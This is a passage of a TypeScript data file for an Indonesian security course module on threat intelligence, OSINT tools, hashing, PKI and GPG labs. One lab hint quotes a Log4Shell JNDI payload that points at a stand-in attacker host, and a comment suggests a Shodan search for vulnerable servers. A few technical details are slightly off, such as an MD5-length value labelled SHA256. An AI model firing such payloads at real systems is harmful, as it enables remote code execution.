import type { ModuleData, CaseStudyVariant } from '../module-types';

export interface Module11Data extends ModuleData {
  caseStudyPool: CaseStudyVariant[];
}

export const module11: Module11Data = {
  id: 11,
  title: "Threat Intelligence & Cryptography",
  description: "Threat Intelligence dan Kriptografi untuk Keamanan Informasi",
  iconName: "Key",

  // ─── THEORY ──────────────────────────────────────────────────────────────────
  theory: [
    {
      title: "Threat Intelligence: Definisi, Tipe, dan Sumber",
      content:
        "Threat Intelligence (TI) atau Cyber Threat Intelligence (CTI) adalah pengetahuan berbasis bukti tentang ancaman siber yang ada atau yang akan terjadi, termasuk konteks, mekanisme, indikator, implikasi, dan panduan yang dapat ditindaklanjuti (actionable). TI bukan sekadar kumpulan data mentah — ia adalah informasi yang sudah dianalisis, divalidasi, dan dikontekstualisasikan untuk mendukung pengambilan keputusan keamanan. Tujuan utama TI adalah mengubah postur keamanan dari reaktif (merespons setelah kejadian) menjadi proaktif (mengantisipasi dan mencegah sebelum terjadi). Threat Intelligence memiliki siklus hidup: Planning & Direction, Collection, Processing, Analysis, Dissemination, dan Feedback.",
      table: {
        caption: "Empat Tipe Threat Intelligence",
        headers: ["Tipe", "Konsumen Utama", "Time Horizon", "Contoh Konten", "Format Umum"],
        rows: [
          [
            "Strategic",
            "CISO, Board of Directors, Manajemen Senior",
            "Jangka panjang (bulan–tahun)",
            "Tren geopolitik, motivasi threat actor, dampak bisnis dari jenis serangan tertentu, ROI investasi keamanan",
            "Laporan naratif, presentasi executive, risk briefing",
          ],
          [
            "Operational",
            "SOC Manager, Incident Response Team Lead",
            "Jangka menengah (hari–minggu)",
            "Campaign yang sedang aktif, TTP (Tactics, Techniques, Procedures) yang digunakan grup APT tertentu, targeting patterns",
            "STIX/TAXII, intelligence reports, threat actor profiles",
          ],
          [
            "Tactical",
            "SOC Analyst Tier 1–2, Threat Hunter",
            "Jangka pendek (jam–hari)",
            "TTP detail: teknik phishing yang digunakan, exploit yang aktif, C2 infrastructure yang digunakan, malware behavior",
            "MITRE ATT&CK mapping, playbooks, detection rules",
          ],
          [
            "Technical",
            "Security Engineer, Firewall/IDS Admin",
            "Real-time (detik–jam)",
            "Specific IoC: IP address C2, domain berbahaya, hash file malware, URL phishing, YARA rules",
            "STIX, CSV, JSON, TAXII feed, threat intel platform",
          ],
        ],
      },
      keyPoints: [
        "Sumber TI dibagi: OSINT (Open Source Intelligence — terbuka, gratis), HUMINT (Human Intelligence — informan, infiltrasi), SIGINT (Signals Intelligence), Commercial Feeds (berbayar, dikurasi)",
        "Threat Intelligence Sharing: ISAC (Information Sharing and Analysis Center) per sektor industri (FS-ISAC untuk keuangan, H-ISAC untuk kesehatan)",
        "Intelligence Lifecycle: Planning → Collection → Processing → Analysis → Dissemination → Feedback — proses berulang (siklus)",
        "Pyramid of Pain (David Bianco): IoC dari mudah ke sulit diganti penyerang: Hash File → IP → Domain → Artefak Jaringan → Tools → TTPs — fokus pada TTPs memberikan dampak paling besar",
        "TAXII (Trusted Automated Exchange of Intelligence Information) adalah protokol transport untuk berbagi TI secara otomatis; STIX (Structured Threat Information eXpression) adalah format data standarnya",
      ],
    },

    {
      title: "IoC (Indicators of Compromise) dan TTP (Tactics, Techniques, Procedures)",
      content:
        "Indicators of Compromise (IoC) adalah artefak forensik atau jejak digital yang mengindikasikan bahwa sebuah sistem telah dikompromis atau sedang diserang. IoC digunakan untuk mendeteksi, memblokir, atau melakukan investigasi ancaman. Berbeda dengan IoC yang bersifat reaktif dan spesifik, TTP (Tactics, Techniques, Procedures) menggambarkan cara kerja dan perilaku threat actor secara lebih general — sehingga lebih tahan lama dan berguna meskipun penyerang mengganti infrastrukturnya. MITRE ATT&CK Framework mendokumentasikan TTP ribuan threat actor dalam knowledge base yang terstruktur, mencakup 14 tactic dan ratusan technique.",
      table: {
        caption: "Tipe-Tipe Indicators of Compromise (IoC)",
        headers: ["Tipe IoC", "Contoh", "Persistensi", "Efektivitas Deteksi", "Sumber"],
        rows: [
          ["File Hash (MD5/SHA256)", "SHA256: 5f4dcc3b5aa765d61d8327deb882cf99", "Rendah — penyerang mudah recompile dengan perubahan minor", "Tinggi jika hash diketahui", "Malware repository (VirusTotal, MalwareBazaar)"],
          ["IP Address C2", "192.168.bad.ip, 103.x.x.x", "Rendah — IP mudah diganti/di-rotate", "Tinggi untuk IP yang diketahui", "Threat intel feed, honeypot, OSINT"],
          ["Domain/URL", "evil-phishing.site/login, c2.malware.top", "Sedang — domain lebih stabil dari IP", "Tinggi untuk domain yang diketahui", "URLhaus, PhishTank, threat intel feed"],
          ["Email Indicators", "From: noreply@spoofed-domain.com, subject pattern", "Sedang", "Tinggi untuk pattern yang diketahui", "Phishing database, email gateways"],
          ["Artefak Jaringan", "User-Agent string, HTTP header patterns, mutex name", "Sedang-Tinggi", "Berguna untuk deteksi behavioral", "PCAP analysis, network forensics"],
          ["Registry Keys (Windows)", "HKLM\\Software\\Malware\\persistence_key", "Tinggi — sulit diganti tanpa rewrite malware", "Sangat berguna untuk persistence detection", "Malware analysis sandbox"],
          ["TTP/Behavioral", "Spearphishing + credential dumping + lateral movement via SMB", "Sangat Tinggi — pola serangan sulit diubah", "Paling berdampak jangka panjang", "MITRE ATT&CK, threat reports"],
        ],
      },
      note: "Fokuskan deteksi pada TTP level (tinggi di Pyramid of Pain), bukan hanya pada IoC teknis (rendah di pyramid). Penyerang APT mengganti IP dan domain setiap minggu, tapi TTP mereka cenderung konsisten selama bertahun-tahun.",
      noteType: "warning",
    },

    {
      title: "OSINT untuk Threat Intelligence",
      content:
        "OSINT (Open Source Intelligence) adalah pengumpulan dan analisis informasi dari sumber yang tersedia secara publik: internet, media sosial, forum dark web (dengan tools yang tepat), database publik, dan sebagainya. Dalam konteks threat intelligence, OSINT digunakan untuk: mengidentifikasi IoC baru, memonitor kebocoran kredensial, melacak infrastruktur threat actor, menganalisis kampanye phishing, dan melakukan due diligence keamanan sebelum memblokir IP. OSINT tidak memerlukan akses khusus atau biaya besar — banyak sumber terbuka gratis dan mudah diakses. Kuncinya adalah efisiensi dalam memilih sumber yang tepat dan kemampuan menganalisis data mentah menjadi intelligence yang actionable.",
      codeSnippet: `# ═══════════════════════════════════════════════════════════
# OSINT TOOLKIT — Command Line Tools untuk Threat Intelligence
# ═══════════════════════════════════════════════════════════

# 1. CVE Database Lookup — kerentanan terbaru
curl -s 'https://cveawg.mitre.org/api/cve/CVE-2021-44228' | python3 -m json.tool | head -40
# Atau gunakan: https://www.cve.org/CVERecord?id=CVE-2021-44228

# 2. VirusTotal CLI — analisis hash malware
# Install: pip install vt-py
# vt --apikey YOUR_KEY file SHA256:5f4dcc3b5aa765d61d83...

# 3. Shodan — cari device terhubung internet yang rentan
# curl -s 'https://api.shodan.io/shodan/host/8.8.8.8?key=API_KEY'
# Query: shodan search 'apache 2.4.49 country:ID' untuk cari server rentan di Indonesia

# 4. URLScan.io — analisis URL mencurigakan
curl -s 'https://urlscan.io/api/v1/search/?q=domain:phishing-example.com' | python3 -m json.tool

# 5. Have I Been Pwned — cek email dalam breach database
curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com' \
  -H 'hibp-api-key: YOUR_KEY' -H 'user-agent: InfoSecCourse'

# 6. AbuseIPDB — cek reputasi IP address
curl -G 'https://api.abuseipdb.com/api/v2/check' \
  --data-urlencode 'ipAddress=1.2.3.4' \
  -H 'Key: YOUR_API_KEY' -H 'Accept: application/json'

# 7. WHOIS dan DNS Lookup
whois evil-domain.com
dig evil-domain.com ANY
nslookup -type=TXT evil-domain.com

# 8. Threatfox — IoC database (gratis)
curl -X POST 'https://threatfox-api.abuse.ch/api/v1/' \
  -d '{"query":"search_ioc","search_term":"cobalt_strike"}'

# 9. MISP (Malware Information Sharing Platform) — threat intel platform
# Self-hosted atau akses komunitas: https://www.circl.lu/services/misp-malware-information-sharing-platform/

# 10. Censys.io — internet-wide scanning data
curl 'https://search.censys.io/api/v2/hosts/1.2.3.4' \
  -u 'API_ID:API_SECRET'`,
    },

    {
      title: "Kriptografi: Konsep Dasar — Hashing, Simetris, dan Asimetris",
      content:
        "Kriptografi adalah ilmu dan seni mengamankan komunikasi dan informasi menggunakan teknik matematis. Dalam konteks keamanan informasi modern, kriptografi melayani empat tujuan utama: Confidentiality (hanya pihak yang berwenang dapat membaca data), Integrity (data tidak dapat dimodifikasi tanpa terdeteksi), Authentication (memverifikasi identitas), dan Non-repudiation (pengirim tidak dapat menyangkal). Tiga kategori utama kriptografi: Hashing menghasilkan output tetap (digest) dari input sembarang panjang — one-way, tidak dapat di-reverse; Symmetric Encryption menggunakan satu kunci yang sama untuk enkripsi dan dekripsi; Asymmetric Encryption menggunakan pasangan kunci publik/privat yang berbeda.",
      table: {
        caption: "Perbandingan Tiga Kategori Kriptografi",
        headers: ["Kategori", "Cara Kerja", "Kunci", "Reversible?", "Kecepatan", "Tujuan Utama", "Contoh Algoritma"],
        rows: [
          ["Hashing", "Input → fungsi hash → digest tetap (fixed-length)", "Tidak ada kunci", "TIDAK (one-way function)", "Sangat cepat", "Integritas data, penyimpanan password", "MD5 (128-bit), SHA-1 (160-bit), SHA-256, SHA-3, bcrypt"],
          ["Symmetric", "Plaintext + Key → Enc → Ciphertext; Ciphertext + Key → Dec → Plaintext", "Satu kunci rahasia", "Ya (dengan kunci yang sama)", "Cepat (1000x lebih cepat dari asimetris)", "Kerahasiaan data bulk (enkripsi file, disk, komunikasi)", "AES-128/256, 3DES, ChaCha20, Blowfish"],
          ["Asymmetric", "Enkripsi dengan Public Key, Dekripsi dengan Private Key (atau sebaliknya untuk signature)", "Pasangan kunci: Public + Private", "Ya (dengan Private Key yang sesuai)", "Lambat (komputasi intensif)", "Pertukaran kunci, tanda tangan digital, autentikasi", "RSA, ECC/ECDSA, Diffie-Hellman, ElGamal"],
        ],
      },
      note: "Dalam praktik, sistem keamanan modern menggunakan hybrid encryption: asymmetric untuk bertukar symmetric key secara aman, kemudian symmetric untuk enkripsi data aktual (karena kecepatan). Contoh: TLS menggunakan RSA/DH untuk key exchange, kemudian AES untuk enkripsi data.",
      noteType: "info",
    },

    {
      title: "Hashing: MD5, SHA-1, SHA-256, dan SHA-3 — Perbandingan dan Keamanan",
      content:
        "Fungsi hash kriptografis mengambil input sembarang panjang dan menghasilkan output dengan panjang tetap yang disebut hash value, message digest, atau checksum. Properti kritis fungsi hash yang baik: Pre-image resistance (tidak bisa menemukan input dari hash), Second pre-image resistance (tidak bisa menemukan input kedua yang menghasilkan hash sama dengan input pertama), Collision resistance (tidak bisa menemukan dua input berbeda yang menghasilkan hash yang sama), dan Avalanche effect (perubahan 1 bit input menghasilkan hash yang sangat berbeda). MD5 dan SHA-1 sudah dianggap TIDAK AMAN untuk tujuan kriptografis karena kerentanan collision. SHA-256 dan SHA-3 adalah standar saat ini.",
      table: {
        caption: "Perbandingan Algoritma Hash Kriptografis",
        headers: ["Algoritma", "Output Size", "Status Keamanan", "Collision Attack", "Kecepatan (CPU)", "Direkomendasikan Untuk"],
        rows: [
          ["MD5", "128-bit (32 hex chars)", "TIDAK AMAN — deprecated", "Collision ditemukan 1996, praktis 2004 (Wang et al.)", "Sangat cepat", "TIDAK untuk keamanan! Hanya checksum non-security"],
          ["SHA-1", "160-bit (40 hex chars)", "TIDAK AMAN — deprecated", "Collision praktis 2017 (SHAttered attack oleh Google/CWI)", "Cepat", "TIDAK untuk keamanan! Sertifikat TLS sudah dilarang SHA-1"],
          ["SHA-256 (SHA-2)", "256-bit (64 hex chars)", "AMAN — standar saat ini", "Tidak ada collision diketahui; teori 2^128 operasi", "Cukup cepat (hardware acceleration AES-NI)", "Password hashing (dengan salt), integritas file, TLS, blockchain"],
          ["SHA-384 (SHA-2)", "384-bit (96 hex chars)", "AMAN", "Tidak ada collision diketahui", "Lebih lambat dari SHA-256", "High-security applications, root CA, code signing"],
          ["SHA-512 (SHA-2)", "512-bit (128 hex chars)", "AMAN", "Tidak ada collision diketahui", "Lebih cepat dari SHA-256 di 64-bit CPU", "Forensik, highest assurance applications"],
          ["SHA-3 (Keccak)", "Variabel: 224–512-bit", "AMAN — struktur berbeda total dari SHA-2", "Tidak ada collision diketahui; berbeda algorithmic family", "Lebih lambat dari SHA-256 di software", "Diversifikasi: backup jika SHA-2 dikompromis"],
          ["bcrypt/Argon2", "Variabel (mengandung salt+cost)", "AMAN untuk password", "N/A — dirancang lambat untuk resistance brute force", "Sangat lambat (by design — cost factor)", "Password hashing SAJA — jangan untuk general data"],
        ],
      },
      note: "JANGAN gunakan MD5 atau SHA-1 untuk tujuan keamanan apapun — termasuk penyimpanan password, verifikasi integritas dokumen sensitif, atau sertifikat digital. Untuk password, gunakan bcrypt, Argon2id, atau scrypt — yang dirancang lambat untuk mencegah brute force. Untuk integritas file, gunakan SHA-256 minimum.",
      noteType: "danger",
    },

    {
      title: "Public Key Cryptography: RSA, ECC, dan Alur Enkripsi Asimetris",
      content:
        "Kriptografi kunci publik (Public Key Cryptography / PKC) atau Asymmetric Cryptography menggunakan dua kunci matematis yang berpasangan: Public Key (dapat dibagikan kepada siapa saja) dan Private Key (harus dijaga kerahasiaannya oleh pemilik). Keunggulan revolusioner PKC adalah memecahkan masalah key distribution: dua pihak yang belum pernah bertemu dapat berkomunikasi secara aman tanpa harus terlebih dahulu berbagi kunci rahasia melalui kanal yang aman. RSA (Rivest-Shamir-Adleman, 1978) adalah algoritma PKC paling populer, keamanannya berdasarkan kesulitan memfaktorkan bilangan prima besar. ECC (Elliptic Curve Cryptography) menggunakan matematika kurva eliptik — memberikan keamanan setara dengan kunci yang jauh lebih pendek (256-bit ECC ≈ 3072-bit RSA).",
      example: {
        title: "Alur Penggunaan Public Key Cryptography — Enkripsi dan Tanda Tangan Digital",
        steps: [
          "═══ SKENARIO 1: Enkripsi untuk Kerahasiaan ═══",
          "1. Bob memiliki Key Pair: Public Key (Kpub_Bob) dan Private Key (Kpriv_Bob)",
          "2. Bob mempublikasikan Kpub_Bob secara terbuka (di sertifikat, website, email)",
          "3. Alice ingin kirim pesan rahasia ke Bob: Ciphertext = Enc(Kpub_Bob, Plaintext)",
          "4. Hanya Bob yang bisa dekripsi: Plaintext = Dec(Kpriv_Bob, Ciphertext)",
          "5. Meskipun penyerang melihat Ciphertext, tanpa Kpriv_Bob tidak bisa dibaca",
          "",
          "═══ SKENARIO 2: Tanda Tangan Digital untuk Autentikasi ═══",
          "1. Alice memiliki Key Pair: Kpub_Alice dan Kpriv_Alice",
          "2. Alice membuat hash dari dokumen: H = SHA256(Dokumen)",
          "3. Alice mengenkripsi hash dengan Private Key-nya: Signature = Enc(Kpriv_Alice, H)",
          "4. Alice mengirim Dokumen + Signature ke Bob",
          "5. Bob mendekripsi signature: H' = Dec(Kpub_Alice, Signature)",
          "6. Bob menghitung sendiri: H = SHA256(Dokumen)",
          "7. Jika H' == H → dokumen sah, berasal dari Alice, dan tidak dimodifikasi",
          "",
          "═══ SKENARIO 3: Key Exchange (Diffie-Hellman) ═══",
          "1. Alice dan Bob setuju pada parameter publik (prime p, generator g)",
          "2. Alice memilih secret a, kirim A = g^a mod p ke Bob",
          "3. Bob memilih secret b, kirim B = g^b mod p ke Alice",
          "4. Alice hitung: S = B^a mod p = g^(ab) mod p",
          "5. Bob hitung: S = A^b mod p = g^(ab) mod p",
          "6. Keduanya mendapat shared secret S yang sama — tanpa secret pernah dikirim melalui jaringan",
        ],
        result: "TLS 1.3 menggunakan ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) untuk key exchange — memberikan Perfect Forward Secrecy (PFS): bahkan jika private key server dikompromis di masa depan, session lama tidak bisa di-decrypt.",
      },
    },

    {
      title: "PKI (Public Key Infrastructure): CA, Sertifikat Digital, dan Chain of Trust",
      content:
        "PKI (Public Key Infrastructure) adalah sistem, teknologi, dan proses yang digunakan untuk membuat, mendistribusikan, menyimpan, mengelola, dan mencabut sertifikat digital. Problem utama yang diselesaikan PKI adalah trust: bagaimana memverifikasi bahwa sebuah public key benar-benar milik entitas yang diklaim? PKI menjawab ini melalui Certificate Authority (CA) — pihak ketiga terpercaya yang menerbitkan sertifikat digital yang mengikat identitas (nama, domain) dengan public key. Sertifikat digital adalah dokumen elektronik berstandar X.509 yang berisi: identitas subjek, public key subjek, masa berlaku, digital signature CA, dan informasi lainnya.",
      example: {
        title: "Alur Penerbitan Sertifikat dan Chain of Trust",
        steps: [
          "═══ PENERBITAN SERTIFIKAT WEBSITE ═══",
          "1. Website operator membuat Key Pair (Kpub_site, Kpriv_site)",
          "2. Membuat Certificate Signing Request (CSR): {domain: bank.co.id, Kpub_site, org info}",
          "3. CSR dikirim ke Certificate Authority (CA) yang dipercaya (DigiCert, Let's Encrypt, Comodo)",
          "4. CA melakukan Domain Validation (DV), Organization Validation (OV), atau Extended Validation (EV)",
          "5. CA menandatangani CSR dengan Private Key CA: Cert = Sign(Kpriv_CA, CSR) → Sertifikat X.509",
          "6. Sertifikat berisi: Subject=bank.co.id, PublicKey=Kpub_site, Issuer=DigiCert, Valid Until=..., Signature_CA",
          "",
          "═══ VERIFIKASI CHAIN OF TRUST OLEH BROWSER ═══",
          "7. Browser terhubung ke bank.co.id, server kirim sertifikat",
          "8. Browser baca: Issuer = DigiCert Intermediate CA",
          "9. Browser cari intermediate CA cert di trust store atau dari server",
          "10. Intermediate CA cert: Issuer = DigiCert Root CA",
          "11. Browser cek Root CA cert di trust store (pre-installed di OS/browser)",
          "12. Verifikasi chain: Leaf Cert → Intermediate CA → Root CA (yang dipercaya)",
          "13. Verifikasi signature setiap level: signature CA valid menggunakan public key CA di level atasnya",
          "14. Cek masa berlaku, CRL/OCSP (sertifikat tidak dicabut), domain cocok",
          "15. Jika semua valid → koneksi HTTPS dengan padlock hijau",
        ],
        result: "Root CA adalah pondasi kepercayaan seluruh internet — compromised Root CA membahayakan SEMUA website yang sertifikatnya di-chain ke CA tersebut. Inilah mengapa pencurian private key CA adalah skenario bencana (catastrophic failure) dalam PKI.",
      },
      keyPoints: [
        "CRL (Certificate Revocation List): daftar sertifikat yang dicabut sebelum masa berlaku habis — browser download periodik",
        "OCSP (Online Certificate Status Protocol): verifikasi real-time status pencabutan sertifikat — lebih cepat dari CRL",
        "OCSP Stapling: server web menyertakan response OCSP yang sudah ditandatangani CA dalam TLS handshake — mengurangi latensi",
        "Certificate Transparency (CT): semua sertifikat publik harus di-log ke public CT log — mencegah CA menerbitkan sertifikat jahat secara diam-diam",
        "Let's Encrypt: CA gratis, otomatis, dan terbuka — menggunakan ACME protocol untuk domain validation dan renewal otomatis",
        "EV (Extended Validation) sertifikat: CA melakukan verifikasi identitas organisasi yang lebih ketat — pernah menampilkan nama organisasi di address bar (kini dihapus di Chrome/Firefox)",
      ],
    },

    {
      title: "Aplikasi Kriptografi: TLS/SSL, PGP, dan Code Signing",
      content:
        "Kriptografi diaplikasikan secara luas dalam kehidupan digital sehari-hari, sering secara transparan di balik layar. TLS (Transport Layer Security), penerus SSL, adalah protokol yang mengamankan hampir semua komunikasi internet — dari HTTPS web browsing, email SMTP/IMAP, hingga koneksi database. PGP (Pretty Good Privacy) dan implementasi open source-nya GnuPG (GPG) digunakan untuk enkripsi email end-to-end dan verifikasi integritas dokumen. Code Signing menggunakan tanda tangan digital untuk memverifikasi bahwa perangkat lunak yang didownload berasal dari developer yang sah dan tidak dimodifikasi sejak ditandatangani.",
      keyPoints: [
        "TLS Handshake (versi singkat TLS 1.3): Client Hello (cipher suites) → Server Hello + Sertifikat → Key Exchange (ECDHE) → Symmetric Key Derived → Encrypted Application Data",
        "TLS 1.3 (2018) menghapus cipher suite yang lemah (RC4, DES, MD5, SHA-1 untuk TLS record), mandatory Perfect Forward Secrecy (PFS), 0-RTT mode untuk resume session lebih cepat",
        "HTTPS Everywhere: Google menggunakan HTTPS sebagai faktor ranking SEO; Chrome menandai HTTP sebagai 'Not Secure'; Let's Encrypt membuat sertifikat gratis universal",
        "PGP Web of Trust: model desentralisasi kepercayaan berbasis saling menandatangani kunci antar pengguna — alternatif dari model hierarki CA",
        "Code Signing: Microsoft Authenticode (Windows), Apple Developer Certificate (macOS/iOS), Android APK Signing — OS hanya menjalankan software yang ditandatangani dengan valid cert",
        "SMIME: standar enkripsi dan tanda tangan email yang menggunakan PKI CA — berbeda dari PGP yang menggunakan web of trust",
        "Disk Encryption: BitLocker (Windows) dan FileVault (macOS) menggunakan AES-256 untuk enkripsi full disk — kunci utama diproteksi oleh TPM chip",
        "Blockchain: menggunakan SHA-256 (Bitcoin) atau Keccak-256 (Ethereum) sebagai fungsi hash untuk linking blocks, dan ECDSA untuk tanda tangan transaksi",
      ],
      codeSnippet: `# ═══════════════════════════════════════════════════════════
# CONTOH PRAKTIS APLIKASI KRIPTOGRAFI
# ═══════════════════════════════════════════════════════════

# 1. Analisis TLS/SSL Certificate dengan OpenSSL
echo | openssl s_client -connect google.com:443 -servername google.com 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -fingerprint -sha256

# Lihat full certificate chain
echo | openssl s_client -connect google.com:443 -showcerts 2>/dev/null | grep -E "s:|i:"

# Cek cipher suite yang digunakan server
nmap --script ssl-enum-ciphers -p 443 google.com | head -30

# 2. Hitung hash file (integritas)
sha256sum software.tar.gz
# Bandingkan dengan hash yang dipublikasikan developer — harus SAMA PERSIS

# 3. GPG — enkripsi dan tanda tangan
# Generate key pair
gpg --gen-key

# Enkripsi file untuk penerima tertentu (menggunakan public key penerima)
gpg --encrypt --recipient "recipient@email.com" --output file.gpg plaintext.txt

# Tanda tangan file (menggunakan private key sendiri)
gpg --sign --detach-sign document.pdf
# → menghasilkan document.pdf.sig

# Verifikasi tanda tangan
gpg --verify document.pdf.sig document.pdf

# 4. Verifikasi Code Signing di Linux (GPG signature)
# Download file dan signature dari developer
wget https://example.com/software-1.0.tar.gz
wget https://example.com/software-1.0.tar.gz.asc
# Import public key developer
gpg --keyserver keyserver.ubuntu.com --recv-keys DEVELOPER_KEY_ID
# Verifikasi
gpg --verify software-1.0.tar.gz.asc software-1.0.tar.gz
# Output: "Good signature from 'Developer Name <dev@example.com>'"`,
    },
  ],

  // ─── LAB ─────────────────────────────────────────────────────────────────────
  lab: {
    title: "Lab 11: Threat Intelligence dan Cryptography Practice",
    downloads: [
      {
        name: "GnuPG (GPG)",
        url: "https://gnupg.org/download/",
        description: "Implementasi open source PGP untuk enkripsi dan tanda tangan digital.",
      },
      {
        name: "OpenSSL",
        url: "https://www.openssl.org/",
        description: "Toolkit kriptografi open source untuk SSL/TLS dan operasi kriptografi umum.",
      },
      {
        name: "VirusTotal",
        url: "https://www.virustotal.com/",
        description: "Platform analisis file dan URL menggunakan 70+ antivirus engine.",
      },
    ],
    steps: [
      {
        title: "CVE Database Lookup — Analisis Log4Shell",
        description:
          "Gunakan API CVE publik dari MITRE untuk mengambil detail kerentanan CVE-2021-44228 (Log4Shell) — salah satu kerentanan paling kritis dalam sejarah (CVSS 10.0). Analisis informasi yang tersedia: CVSS score, affected products, description, dan referensi. Ini adalah praktik threat intelligence: memahami kerentanan sebelum (atau saat) dieksploitasi penyerang.",
        command: "curl -s 'https://cveawg.mitre.org/api/cve/CVE-2021-44228' | python3 -m json.tool | head -50",
        expectedOutput:
          '{\n  "dataType": "CVE_RECORD",\n  "cveMetadata": {\n    "cveId": "CVE-2021-44228",\n    "state": "PUBLISHED"\n  },\n  "containers": {\n    "cna": {\n      "descriptions": [{"lang": "en", "value": "Apache Log4j2..."}]\n    }\n  }\n}',
        hint: "CVE-2021-44228 (Log4Shell) memiliki CVSS score 10.0 (maksimal). Kerentanan ini ada di library Apache Log4j yang digunakan oleh jutaan aplikasi Java. Penyerang bisa melakukan Remote Code Execution (RCE) dengan input sederhana seperti '${jndi:ldap://evil.com/x}' di log message.",
        screenshotNote: "Screenshot output JSON CVE-2021-44228 dengan highlight pada: CVSS score, description, affected products, dan tanggal publikasi.",
      },
      {
        title: "File Integrity Hashing — MD5 vs SHA-256",
        description:
          "Praktikkan hashing file untuk verifikasi integritas. Buat file teks, hitung hash MD5 dan SHA-256-nya, dan catat hasilnya. Bandingkan panjang output: MD5 menghasilkan 32 karakter hex (128-bit), SHA-256 menghasilkan 64 karakter hex (256-bit). Ini adalah teknik yang digunakan untuk memverifikasi bahwa file yang didownload tidak dimodifikasi.",
        command: "echo 'InfoSec Testing Lab — Bina Insani' > testfile.txt && echo '=== MD5 Hash ===' && md5sum testfile.txt && echo '=== SHA-256 Hash ===' && sha256sum testfile.txt && echo '=== File Content ===' && cat testfile.txt",
        expectedOutput:
          "=== MD5 Hash ===\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  testfile.txt\n=== SHA-256 Hash ===\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  testfile.txt\n=== File Content ===\nInfoSec Testing Lab — Bina Insani",
        hint: "MD5 = 32 karakter hex (128-bit). SHA-256 = 64 karakter hex (256-bit). Gunakan perintah 'wc -c <<< $(sha256sum testfile.txt | cut -d' ' -f1)' untuk menghitung panjang hash (harus 64).",
        screenshotNote: "Screenshot output kedua hash dengan highlight pada panjang masing-masing (32 vs 64 karakter).",
      },
      {
        title: "Demonstrasi Avalanche Effect",
        description:
          "Modifikasi satu karakter pada isi file dan bandingkan hashnya dengan file original. Prinsip Avalanche Effect menyatakan bahwa perubahan satu bit pada input menghasilkan output hash yang sangat berbeda (~50% bit berbeda). Ini adalah properti kritis fungsi hash kriptografis yang membuatnya dapat diandalkan untuk deteksi perubahan.",
        command: "echo 'InfoSec Testing Lab — Bina Insani' > file_asli.txt && echo 'infosec Testing Lab — Bina Insani' > file_modif.txt && echo '=== Hash File Asli ===' && sha256sum file_asli.txt && echo '=== Hash File Modifikasi (1 karakter berubah) ===' && sha256sum file_modif.txt && echo '=== Perbedaan: huruf I -> i pada awal kata ===' && diff file_asli.txt file_modif.txt",
        expectedOutput:
          "=== Hash File Asli ===\nabc123... (64 karakter hex)\n=== Hash File Modifikasi (1 karakter berubah) ===\ndef456... (64 karakter hex — SAMA SEKALI BERBEDA)",
        hint: "Perubahan hanya dari 'I' ke 'i' (satu karakter), namun hash SHA-256 berubah total. Ini membuktikan bahwa tidak mungkin membuat perubahan kecil pada file tanpa mengubah hashnya — properti yang memastikan integritas.",
        screenshotNote: "Screenshot kedua hash yang menunjukkan output yang sangat berbeda meskipun perubahan input minimal. Beri anotasi perbedaan antara kedua hash.",
      },
      {
        title: "GPG Key Generation — Membuat Key Pair RSA",
        description:
          "Generate pasangan kunci GPG (GNU Privacy Guard) menggunakan RSA. GPG mengimplementasikan standar OpenPGP untuk enkripsi dan tanda tangan email dan file. Private key yang dihasilkan harus dijaga kerahasiaannya; public key dapat dibagikan kepada siapa saja yang ingin berkirim pesan aman kepada Anda.",
        command: "gpg --batch --gen-key <<'GPGEOF'\nKey-Type: RSA\nKey-Length: 4096\nName-Real: Lab InfoSec\nName-Email: lab@infosec.binainsani.ac.id\nExpire-Date: 1y\n%no-protection\n%commit\nGPGEOF",
        expectedOutput:
          "gpg: key XXXXXXXXXXXXXXXX marked as ultimately trusted\ngpg: directory '/home/user/.gnupg' created\ngpg: Done",
        hint: "Key-Length: 4096 untuk RSA lebih aman dari 2048. Expire-Date: 1y berarti key expire dalam 1 tahun — praktik baik untuk rotasi kunci reguler. %no-protection menghilangkan passphrase untuk kemudahan lab; di production SELALU gunakan passphrase yang kuat.",
        screenshotNote: "Screenshot output GPG key generation yang menunjukkan key ID yang dihasilkan.",
      },
      {
        title: "GPG Encrypt dan Decrypt File",
        description:
          "Enkripsi file menggunakan public key GPG yang baru dibuat, kemudian dekripsi kembali. Langkah ini mendemonstrasikan alur kerja enkripsi asimetris: siapapun dengan public key dapat mengenkripsi pesan, tapi hanya pemegang private key yang dapat membacanya. Perhatikan ukuran file: file terenkripsi akan sedikit lebih besar dari aslinya.",
        command: "echo 'Data rahasia: password=SuperSecret123!' > plaintext.txt && gpg --encrypt --recipient 'lab@infosec.binainsani.ac.id' --output encrypted.gpg plaintext.txt && ls -la plaintext.txt encrypted.gpg && echo '=== Dekripsi ===' && gpg --decrypt encrypted.gpg",
        expectedOutput:
          "-rw-r--r-- plaintext.txt (kecil)\n-rw-r--r-- encrypted.gpg (lebih besar, terenkripsi)\n=== Dekripsi ===\ngpg: encrypted with RSA key\nData rahasia: password=SuperSecret123!",
        hint: "Flag --armor menghasilkan output ASCII-armored (dapat dikirim via email teks biasa). Tanpa --armor, output adalah binary. Coba: 'cat encrypted.gpg' — tidak terbaca. Setelah 'gpg --decrypt', isi file terbaca kembali.",
        screenshotNote: "Screenshot langkah enkripsi (file .gpg terbuat), 'cat encrypted.gpg' yang menunjukkan data tidak terbaca, dan hasil dekripsi yang menampilkan konten asli.",
      },
      {
        title: "SSL/TLS Certificate Analysis dengan OpenSSL",
        description:
          "Gunakan OpenSSL untuk memeriksa sertifikat SSL/TLS dari website produksi (google.com). Analisis informasi penting dalam sertifikat: Subject (domain yang disertifikasi), Issuer (CA yang menerbitkan), masa berlaku, algorithm yang digunakan, dan SANs (Subject Alternative Names). Ini adalah praktik threat intelligence: memahami infrastruktur PKI target.",
        command: "echo | openssl s_client -connect google.com:443 -servername google.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates -fingerprint -sha256 -text | grep -E 'Subject:|Issuer:|Not Before:|Not After:|Fingerprint|DNS:|Algorithm'",
        expectedOutput:
          "subject=CN = *.google.com\nissuer=C = US, O = Google Trust Services, CN = GTS CA 1C3\nnotBefore=...\nnotAfter=...\nSHA256 Fingerprint=XX:XX:XX...\nDNS:*.google.com, DNS:google.com",
